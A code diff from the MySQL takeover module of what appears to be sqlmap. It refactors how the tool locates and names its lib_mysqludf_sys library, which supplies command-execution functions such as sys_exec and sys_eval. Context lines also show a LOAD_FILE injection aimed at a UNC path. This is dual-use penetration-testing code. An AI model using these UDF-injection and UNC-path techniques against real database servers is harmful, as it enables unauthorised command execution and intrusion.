@@ -64,7 +64,7 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
         self.__datadir      = None
         self.excludeDbsList = MYSQL_SYSTEM_DBS
         self.sysUdfs        = {
-                                # UDF name:      UDF return data-type
+                                # UDF name:    UDF return data-type
                                 "sys_exec":    { "return": "int" },
                                 "sys_eval":    { "return": "string" },
                                 "sys_bineval": { "return": "int" }
@@ -534,7 +534,18 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
             # paths specified in /etc/ld.so.conf file, none of these
             # paths are writable by mysql user by default
             self.udfRemoteFile = "/usr/lib/%s.%s" % (self.udfSharedLibName, self.udfSharedLibExt)
-            
+
+    def udfSetLocalPaths(self):
+        self.udfLocalFile     = paths.SQLMAP_UDF_PATH
+        self.udfSharedLibName = "libsqlmapudf%s" % randomStr(lowercase=True)
+
+        if kb.os == "Windows":
+            self.udfLocalFile   += "/mysql/windows/lib_mysqludf_sys.dll"
+            self.udfSharedLibExt = "dll"
+        else:
+            self.udfLocalFile   += "/mysql/linux/lib_mysqludf_sys.so"
+            self.udfSharedLibExt = "so"
+
     def udfCreateFromSharedLib(self, udf, inpRet):
         if udf in self.udfToCreate:
             logger.info("creating UDF '%s' from the binary UDF file" % udf)
@@ -548,21 +559,7 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
             self.createdUdf.add(udf)
         else:
             logger.debug("keeping existing UDF '%s' as requested" % udf)
-            
-    def udfInjectCmd(self):
-        self.udfLocalFile     = paths.SQLMAP_UDF_PATH
-        self.udfSharedLibName = "libsqlmapudf%s" % randomStr(lowercase=True)
 
-        if kb.os == "Windows":
-            self.udfLocalFile   += "/mysql/windows/lib_mysqludf_sys.dll"
-            self.udfSharedLibExt = "dll"
-        else:
-            self.udfLocalFile   += "/mysql/linux/lib_mysqludf_sys.so"
-            self.udfSharedLibExt = "so"
-
-        self.checkNeededUdfs()
-        self.udfInjectCore(self.sysUdfs)
-        
     def uncPathRequest(self):
         if not kb.stackedTest:
             query   = agent.prefixQuery(" AND LOAD_FILE('%s')" % self.uncPath)
